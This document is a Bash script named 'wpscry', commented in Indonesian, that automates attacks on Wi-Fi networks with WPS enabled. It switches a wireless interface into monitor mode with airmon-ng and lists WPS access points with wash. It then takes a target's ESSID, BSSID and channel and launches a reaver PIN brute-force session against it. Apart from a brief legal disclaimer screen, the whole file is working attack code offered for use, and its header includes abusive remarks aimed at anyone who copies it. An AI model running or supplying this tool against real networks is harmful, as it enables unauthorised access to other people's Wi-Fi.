#!/bin/bash
#--------------
# wpscry - Serang otomatis jaringan Wi-Fi yang menggunakan vitur WPS.
# Dibuat oleh Ropay
#--------------
# Jangan diotak-atik jing, GW cape bikinnya lu kira gampang?
# Tinggal pake apa susahnya sih. ga usah deh lo mau recode 
# segala terus ganti atas nama lo buat pansos. lu kira itu 
# keren?. lo itu sama aja kaya sampah!
#--------------
# Maaf kalo kata-kata GW agak sedikit kasar :)
#--------------

# Fungsi untuk mengecek root.
function cek_root(){
	if [[ "$EUID" -ne 0 ]]; then
		echo "[-] Script ini harus dijalankan sebagi root."
		exit
	fi
}

# Fungsi untuk mengecek alat yang diperlukan oleh wpscry.
function cek_alat(){

        daftar_alat_belum_terinstal=()

        daftar_alat=(
	        "reaver"
	        "wash"
	        "airmon-ng" 
	        "iwconfig"
	)

        for cek_alat in "${daftar_alat[@]}"; do
                if ! command -v "${cek_alat}" >> /dev/null 2>&1; then 
                        daftar_alat_belum_terinstal+=("${cek_alat}")
                fi
        done

        if [[ "${#daftar_alat_belum_terinstal[@]}" -ne 0  ]]; then
	       echo "[-] Script ini tidak dapat dijalankan, karena ada alat yang belum terinstal."
	       echo ""
	       echo "Alat:"
	
               for alat_belum_terinstal in "${daftar_alat_belum_terinstal[@]}"; do
                       echo "- ${alat_belum_terinstal}"
	       done
	       exit 1
        fi
        
}

# Fungsi untuk membuat folder 'sesi' untuk menyimpan sesi dari alat reaver.
function buat_folder(){
        nama_folder="sesi"
	if [[ ! -d "${nama_folder}" ]]; then
                mkdir -p "${nama_folder}"
		chmod 755 "${nama_folder}"
        fi
}

# Fungsi untuk menampilkan peringatan 
function peringatan(){
        # Kata-kata peringatan 
        clear
        echo "PERINGATAN:"
        echo ""
        echo "Script ini hanya untuk tujuan pendidikan dan pengujian keamanan. Menggunakan script ini untuk mengakses atau"
        echo "menyerang jaringan Wi-Fi tanpa izin eksplisit dari pemiliknya adalah ilegal dan melanggar hukum di banyak"
        echo "negara. Pengguna bertanggung jawab penuh atas segala konsekuensi dari penggunaan script ini."
        echo ""
        echo "Dengan menggunakan script ini, Anda menyetujui:"
        echo ""
        echo "1. Menggunakan hanya pada jaringan yang Anda miliki atau dengan izin eksplisit dari pemiliknya."
        echo "2. Tidak menggunakan script ini untuk tujuan ilegal atau tidak etis."
        echo "3. Mematuhi semua hukum dan peraturan yang berlaku terkait dengan akses dan keamanan jaringan."
        echo "4. Bertanggung jawab penuh atas semua tindakan yang Anda lakukan menggunakan script ini, termasuk kerusakan yang"
        echo "   mungkin timbul pada jaringan atau data."
        echo ""
        echo "Jika Anda tidak menyetujui ketentuan ini, harap segera keluar dan tidak menggunakan script ini. Penggunaan script"
        echo "ini berarti Anda telah membaca, memahami, dan menyetujui semua ketentuan di atas."
        echo ""

        # Nanya apakah mau menggunakan script atau tidak.
	while true; do
                read -p "Apakah Anda ingin melanjutkannya (iya/tidak): " nanya
		if [[ "${nanya}" == "iya" ]]; then
                        break
		elif [[ "${nanya}" == "tidak" ]]; then
                        exit 0
                else
		        echo "[-] Masukkan tidak valid. Harap masukkan'iya' atau'tidak'."
                        continue
                fi
        done
}

function selamat_datang(){
        # Membersihkan layar terminal.
        clear
	# Menampilkan ucapan selamat datang di wpscry.
	echo "Selamat datang di wpscry!"
        echo ""
}

# Fungsi untuk mengatur interface yang ingin digunakan.
function mengatur_interface(){
        # Memasukkan nama interface yang ingin digunakan.
	while true; do
		read -p "Nama interface: " interface
                # Kondisi jika masukkan nama interface tidak kosong.
		if [[ ! -z "${interface}" ]]; then
                        # Kondisi jika interface ada.
			if ip link show | grep -q -w "${interface}"; then
				echo "[+] Interface ${interface} ditemukan."
				break
                        # Kondisi jika interface tidak ada.
			else
				echo "[-] Interface ${interface} tidak ditemukan."
				continue
			fi
                # Kondisi jika masukkan nama interface kosong.
		else
			echo "[-] Nama interface tidak boleh kosong."
			continue
		fi
	done
}

# Fungsi untuk mengaktifkan mode monitor pada interface yang sudah diatur.
function mengaktifkan_mode_monitor(){
                # Kondisi jika interface sudah berada dalam mode monitor.
		if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
			echo "[+] Interface ${interface} sudah dalam mode monitor."
                # Kondisi jika interface belum berada dalam mode monitor.
		else
			echo "[-] Interface ${interface} belum dalam mode monitor."
			echo "[*] Mengaktifkan mode monitor pada interface ${interface}..."
                        # Menghentikan proses yang dapat mengganggu mode monitor.
			airmon-ng check kill >> /dev/null 2>&1
                        # Mengaktifkan mode monitor.
			airmon-ng start "${interface}" >> /dev/null 2>&1
                        # Kondisi jika nama interface berubah menjadi 'mon' setelah diaktifkan ke mode monitor.
			if ip link show | grep -q -w  "${interface}mon"; then
				interface="${interface}mon"
                        # Kondisi jika nama interface tidak berubah menjadi 'mon' setelah diaktifkan ke mode monitor.
			else
				interface="${interface}"
			fi

                        # Kondisi jika interface ada.
                        if ip link show | grep -q -w "${interface}"; then
			        # Kondisi jika interface berhasil diaktifkan ke mode monitor.
			        if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
				        echo "[+] Berhasil mengaktifkan mode monitor pada interface ${interface}."
	                        # Kondisi jika interface tidak berhasil diaktifkan ke mode monitor.
			        else
				        echo "[-] Gagal mengaktifkan mode monitor pada interface ${interface}."
			        	exit 1
			        fi

		        fi
		fi
}

# Fungsi untuk memindai jaringan wps menggunakan alat wash.
function memindai_jaringan_wps(){
	echo "[*] Memindai jaringan WPS (Tekan CTRL+C untuk menghentikan pemindaian)..."
	echo ""
        # Memindai jaringan WPS
	wash -i "${interface}"
}

# Fungsi untuk mengatur ESSID yang ingin di serang.
function mengatur_essid(){
	# Memasukkan ESSID yang ingin diserang.
	while true; do
		read -p "ESSID: " essid
                # Kondisi jika masukkan ESSID tidak kosong.
		if [[ ! -z "${essid}" ]]; then
                        # Kondisi jika masukkan ESSID 'kembali',
                        if [[ "${essid}" == "kembali" ]]; then
			        # Memanggil fungsi 'mengatur_interface'.
                                mengatur_interface
				# Memanggil fungsi 'mengaktifkan_mode_monitor'.
				mengaktifkan_mode_monitor
                                # Memanggil fungsi 'memindai_jaringan_wps'.
				memindai_jaringan_wps
                        # Kondisi jika masukkan ESSID bukan 'kembali',
                        else
                                echo "[+] ${p}ESSID: '${essid}'"
			        break
                        fi	
		# Kondisi jika masukkan ESSID kosong.
		else
			echo "[-] ESSID tidak boleh kosong."
			continue
		fi
	done
}

# Fungsi untuk mengatur BSSID yang ingin di serang.
function mengatur_bssid(){
	# Mengatur BSIID yang ingin diserang.
	while  true; do
		read -p "BSSID: " bssid
                # Kondisi jika masukkan BSSID tidak kosong.
		if [[ ! -z "${bssid}" ]]; then
                        # Kondisi jika masukkan BSSID 'kembali',
                        if [[ "${bssid}" == "kembali" ]]; then
                                mengatur_essid
			# Kondisi jika masukkan BSSID bukan 'kembali',
                        else
			        # Kondisi jika masukkan BSSID merupakan format BSSID yang valid.
                                if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]; then
				        echo "[+] BSSID: '${bssid}'"
			                break
		                # Kondisi jika masukkan BSSID bukan merupakan format BSSID yang valid.
			        else
				        echo "[-] BSSID tidak valid."
				        continue
			        fi
                        fi
		# Kondisi jika masukkan BSSID kosong.
		else
			echo "[-] BSSID tidak boleh kososng."
			continue
		fi
	done
}

# Fungsi untuk mengatur Channel dari Access Point yang ingin di serang.
function mengatur_channel(){
	# Mengatur channel dari Access Point yang ingin diserang.
	while true; do
		read -p "Channel: " channel
                # Kondisi jika masukkan Channel tidak kosong.
		if [[ ! -z "${channel}" ]]; then
                        # Kondisi jika masukkan Channel 'kembali',
                        if [[ "${channel}" == "kembali" ]]; then
			        mengatur_bssid
	                # Kondisi jika masukkan Channel bukan 'kembali',
                        else
			        # Kondisi jika masukkan Channel merupakan angka.
                                if [[ "${channel}" =~ ^[0-9]+$ ]]; then
				        echo "[+] Channel: '${channel}'"
			 	        break
	                        # Kondisi jika masukkan Channel bukan merupakan angka.
			        else
			    	        echo "[-] Channel tidak valid."
				        continue
			        fi
                        fi
		# Kondisi jika masukkan channel kosong.
		else
			echo "[-] Channel tidak boleh kosong."
			continue
		fi
	done
	read -p "Tekan [Enter] untuk memulai serangan..."
}

# Fungsi untuk melakukan serangan terhadap target yang sudah diatur.
function menjalankan_serangan(){
        waktu=$(date "+%d-%m-%Y_%H:%M:%S")
        sesi="${nama_folder}/${essid}_${waktu}.session"
	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -v
        #
        # Keterangan:
	#
	# -i   : Menentukan interface jaringan yang akan digunakan (misalnya, wlan0).
        # -c   : Menentukan saluran (channel) jaringan Wi-Fi yang akan diserang.
	# -b   : Menentukan bssid (alamat MAC) dari router atau access point yang akan diserang.
        # -e   : Menentukan ESSID (nama jaringan Wi-Fi) dari jaringan yang akan diserang.
	# -s   : Menentukan file sesi yang digunakan untuk menyimpan atau melanjutkan serangan.
	# -v   : Menambahkan tingkat verbositas (verbosity) untuk output yang lebih detail selama serangan.
}

# Fungsi untuk menonaktifkan mode monitor pada interface yang sudah diatur.
function menonaktifkan_mode_monitor(){
        airmon-ng stop "${interface}" >> /dev/null 2>&1
	systemctl restart NetworkManager
        exit 0
}

# Fungsi utama wpscry.
function wpscry(){
        # Memanggil fungsi cek_root.
	cek_root
        # Memanggil fungsi cek_alat.
        cek_alat
	# Memanggil fungsi buat_folder.
        buat_folder
	# Memanggil fungsi peringatan 
	peringatan
	# Memanggil fungsi mengatur_interface.
	mengatur_interface
        # Memanggil fungsi mengaktifkan_mode_monitor.
	mengaktifkan_mode_monitor
        # Memanggil fungsi memindai_jaringan_wps.
	memindai_jaringan_wps
        # Memanggil fungsi mengatur_essid.
	mengatur_essid
        # Memanggil fungsi mengatur_bssid.
        mengatur_bssid
	# Memanggil fungsi mengatur_channel.
	mengatur_channel
        # Memanggil fungsi menjalankan_serangan.
	menjalankan_serangan
        # Memanggil fungsi menonaktifkan_mode_monitor.
        menonaktifkan_mode_monitor
}

# Memanggil fungsi wpscry.
wpscry
